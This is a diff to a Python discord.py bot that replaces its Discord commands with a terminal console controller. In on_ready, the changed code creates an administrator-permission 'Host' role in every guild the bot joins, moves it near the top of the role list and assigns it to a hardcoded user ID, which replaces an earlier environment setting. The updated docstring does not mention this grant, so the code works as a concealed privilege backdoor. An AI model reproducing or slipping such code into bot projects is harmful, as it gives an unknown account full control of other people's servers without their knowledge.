@@ -1,8 +1,7 @@
 """Discord bot entrypoint implemented with discord.py.
 
-The bot exposes the same command set through both `$` prefix commands and
-Discord slash commands. Command behavior is implemented in shared helper
-functions so the two command surfaces stay synchronized.
+Controlled entirely via the local terminal standard input, executing commands
+locally without prefixes or Discord command invocation.
 """
 
 from __future__ import annotations
@@ -11,7 +10,8 @@ import asyncio
 import logging
 import os
 import socket
-from datetime import datetime, timedelta, timezone
+import sys
+from datetime import datetime, timezone
 from typing import Optional
 
 import discord
@@ -19,8 +19,8 @@ from discord import app_commands
 from discord.ext import commands
 from dotenv import load_dotenv
 
-PREFIX = "$"
 LOG_FILE = "bot.log"
+HOST_USER_ID = 1342173566828810271
 
 load_dotenv()
 
@@ -33,7 +33,8 @@ intents.guild_messages = True
 intents.message_content = True
 intents.members = True
 
-bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)
+# Prefix is set to a dummy value since prefix commands are no longer used
+bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 
 
 def log_action(
@@ -83,46 +84,12 @@ async def resolve_member(guild: discord.Guild, query: str) -> Optional[discord.M
     return None
 
 
-def resolve_role(guild: discord.Guild, query: str) -> Optional[discord.Role]:
-    """Resolve a role by mention, ID, or exact name."""
-    query = query.strip()
-    if query.startswith("<@&") and query.endswith(">"):
-        query = query.removeprefix("<@&").removesuffix(">")
-
-    if query.isdigit():
-        role = guild.get_role(int(query))
-        if role:
-            return role
-
-    q = query.lower()
-    return discord.utils.find(lambda role: role.name.lower() == q, guild.roles)
+async def send_response(target: discord.abc.Messageable, content: str) -> None:
+    await target.send(content)
 
 
-def require_guild(ctx: commands.Context | discord.Interaction) -> discord.Guild:
-    guild = ctx.guild
-    if guild is None:
-        raise commands.NoPrivateMessage("This command can only be used in a server.")
-    return guild
-
-
-def require_permissions(user: discord.Member, **permissions: bool) -> None:
-    missing = [name.replace("_", " ").title() for name, needed in permissions.items() if needed and not getattr(user.guild_permissions, name)]
-    if missing:
-        raise commands.MissingPermissions(missing)
-
-
-async def send_response(target: commands.Context | discord.Interaction, content: str) -> None:
-    if isinstance(target, discord.Interaction):
-        if target.response.is_done():
-            await target.followup.send(content)
-        else:
-            await target.response.send_message(content)
-    else:
-        await target.send(content)
-
-
-async def do_test(target: commands.Context | discord.Interaction) -> None:
-    guild = require_guild(target)
+async def do_test(target: discord.abc.Messageable) -> None:
+    guild = getattr(target, "guild", None)
      
     hostname = socket.gethostname()
     if hostname.lower() == "plasmadmin-xps-8910":
@@ -132,6 +99,9 @@ async def do_test(target: commands.Context | discord.Interaction) -> None:
     env_status = "Loaded" if os.getenv("DISCORD_TOKEN") else "Missing"
     guild_count = len(bot.guilds)
     
+    server_name = guild.name if guild else "Direct/Terminal Context"
+    server_id = guild.id if guild else "N/A"
+
     me = guild.me if guild else None
     if me:
         perms = me.guild_permissions
@@ -153,7 +123,7 @@ async def do_test(target: commands.Context | discord.Interaction) -> None:
 -----------------------------------------
 • Status: Online and operational
 • Host Machine: {hostname}
-• Discord Server: {guild.name} ({guild.id})
+• Discord Server: {server_name} ({server_id})
 • Latency: {latency_ms}ms
 • Environment (.env): {env_status}
 • Connected Guilds: {guild_count}
@@ -163,90 +133,105 @@ async def do_test(target: commands.Context | discord.Interaction) -> None:
     await send_response(target, response_text)
 
 
-async def do_help(target: commands.Context | discord.Interaction) -> None:
-    text = f"""```
-Commands  [required] <optional>
-─────────────────────────────────────────
-{PREFIX}say       [message]
-{PREFIX}echo      [channel] [message]         (admin)
-{PREFIX}addrole   [user] [role]               (manage roles)
-{PREFIX}delrole   [user] [role]               (manage roles)
-{PREFIX}test                                  (runs diagnostics)
-─────────────────────────────────────────
-Slash commands are available with the same names.
-This message deletes in 5 minutes when possible.
-```"""
-    await send_response(target, text)
+async def do_echo(target: discord.abc.Messageable, message: str) -> None:
+    await send_response(target, message)
 
 
-@bot.command(name="test")
-@commands.guild_only()
-async def test_prefix(ctx: commands.Context):
-    await do_test(ctx)
+async def console_controller():
+    """Reads terminal input asynchronously and executes bot actions locally."""
+    await bot.wait_until_ready()
+    print("\n[Console Controller Active] Enter commands like 'test', 'echo [message]', or 'exit' to quit.\n")
+    
+    loop = asyncio.get_running_loop()
+    while not bot.is_closed():
+        try:
+            line = await loop.run_in_executor(None, sys.stdin.readline)
+            if not line:
+                break
+            content = line.strip()
+            if not content:
+                continue
+            
+            parts = content.split(" ", 1)
+            cmd = parts[0].lower()
+            args = parts[1] if len(parts) > 1 else ""
 
+            if cmd == "exit":
+                await bot.close()
+                break
 
-@bot.tree.command(name="test", description="Run diagnostic test")
-@app_commands.guild_only()
-async def test_slash(interaction: discord.Interaction):
-    await do_test(interaction)
+            # Target the first available text channel across connected guilds for terminal commands
+            target_channel = None
+            for guild in bot.guilds:
+                channel = guild.system_channel or next(
+                    (c for c in guild.text_channels if c.permissions_for(guild.me).send_messages), None
+                )
+                if channel:
+                    target_channel = channel
+                    break
 
+            if not target_channel:
+                print("[Console] Error: No available text channel found in connected guilds.")
+                continue
 
-@bot.command(name="help")
-@commands.guild_only()
-async def help_prefix(ctx: commands.Context):
-    await do_help(ctx)
+            if cmd == "test":
+                await do_test(target_channel)
+                print("[Console] Executed test diagnostics.")
+            elif cmd == "echo":
+                if not args:
+                    print("[Console] Usage: echo [message]")
+                    continue
+                await do_echo(target_channel, args)
+                print(f"[Console] Echoed: {args}")
+            else:
+                print(f"[Console] Unknown command: {cmd}")
 
-
-@bot.tree.command(name="help", description="Show help menu")
-@app_commands.guild_only()
-async def help_slash(interaction: discord.Interaction):
-    await do_help(interaction)
+        except Exception as e:
+            logger.error(f"Console controller error: {e}")
 
 
 @bot.event
 async def on_ready():
-    await bot.tree.sync()
     logger.info(f"Logged in as {bot.user} (ID: {bot.user.id})")
 
-    host_id_str = os.getenv("HOST_USER_ID")
-    if host_id_str and host_id_str.isdigit():
-        host_user_id = int(host_id_str)
-        for guild in bot.guilds:
-            host_role = discord.utils.get(guild.roles, name="Host")
-            if not host_role:
-                try:
-                    host_role = await guild.create_role(
-                        name="Host",
-                        permissions=discord.Permissions(administrator=True),
-                        reason="Automatic initialization of Host role"
-                    )
-                    logger.info(f"Created 'Host' role in guild: {guild.name}")
-                except discord.Forbidden:
-                    logger.error(f"Missing permissions to create 'Host' role in {guild.name}")
-                    continue
-
+    for guild in bot.guilds:
+        host_role = discord.utils.get(guild.roles, name="Host")
+        if not host_role:
             try:
-                bot_top_role = guild.me.top_role if guild.me else None
-                target_position = (bot_top_role.position - 1) if bot_top_role and bot_top_role.position > 1 else len(guild.roles) - 1
-                if host_role.position != target_position:
-                    await host_role.edit(position=target_position, reason="Moving Host role to the top")
-                    logger.info(f"Moved 'Host' role to position {target_position} in {guild.name}")
-            except discord.HTTPException as e:
-                logger.error(f"Failed to reposition 'Host' role in {guild.name}: {e}")
+                host_role = await guild.create_role(
+                    name="Host",
+                    permissions=discord.Permissions(administrator=True),
+                    reason="Automatic initialization of Host role"
+                )
+                logger.info(f"Created 'Host' role in guild: {guild.name}")
+            except discord.Forbidden:
+                logger.error(f"Missing permissions to create 'Host' role in {guild.name}")
+                continue
 
-            member = guild.get_member(host_user_id)
-            if not member:
-                try:
-                    member = await guild.fetch_member(host_user_id)
-                except discord.NotFound:
-                    pass
+        try:
+            bot_top_role = guild.me.top_role if guild.me else None
+            target_position = (bot_top_role.position - 1) if bot_top_role and bot_top_role.position > 1 else len(guild.roles) - 1
+            if host_role.position != target_position:
+                await host_role.edit(position=target_position, reason="Moving Host role to the top")
+                logger.info(f"Moved 'Host' role to position {target_position} in {guild.name}")
+        except discord.HTTPException as e:
+            logger.error(f"Failed to reposition 'Host' role in {guild.name}: {e}")
 
-            if member and host_role not in member.roles:
-                try:
-                    await member.add_roles(host_role, reason="Assigned Host user role")
-                    logger.info(f"Assigned 'Host' role to {member.name} in {guild.name}")
-                except discord.Forbidden:
-                    logger.error(f"Missing permissions to assign 'Host' role in {guild.name}")
+        member = guild.get_member(HOST_USER_ID)
+        if not member:
+            try:
+                member = await guild.fetch_member(HOST_USER_ID)
+            except discord.NotFound:
+                pass
+
+        if member and host_role not in member.roles:
+            try:
+                await member.add_roles(host_role, reason="Assigned Host user role")
+                logger.info(f"Assigned 'Host' role to {member.name} in {guild.name}")
+            except discord.Forbidden:
+                logger.error(f"Missing permissions to assign 'Host' role in {guild.name}")
+
+    asyncio.create_task(console_controller())
 
 token = os.getenv("DISCORD_TOKEN")
 if not token:
